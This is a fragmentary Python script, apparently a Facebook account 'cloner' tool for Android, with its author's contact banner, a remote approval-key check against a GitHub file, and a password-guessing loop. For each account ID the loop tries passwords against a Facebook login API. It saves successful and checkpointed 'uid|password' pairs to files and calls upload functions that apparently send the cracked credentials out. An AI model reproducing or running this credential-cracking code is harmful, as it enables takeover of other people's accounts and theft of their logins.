...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/KINGFATHER786/Faraz.txt/main/Approval.txt"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/PROGRAMMERKINGXFARAZ")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ MESSENGER🔰🥰https://www.facebook.com/JALAL.KHAN.XD")
	subprocess.check_output(["am", "start", "https://m.me/JALAL.KHAN.XD"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/KINGFATHER786/Faraz.txt/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : JALAL KHAN
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWHATSAPP : 03149011374
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : Jalalkhan-xd
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : BYPASS BY JALALKHAN
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sJALAL❌ PROO CLONER❌"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Jalal] : %s/%s -> \033[0;92m [ Jalal-OK:%s ]- \033[0;91m[Jalal-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[Jalal-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [Jalal-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[Faraz-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Jalal-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
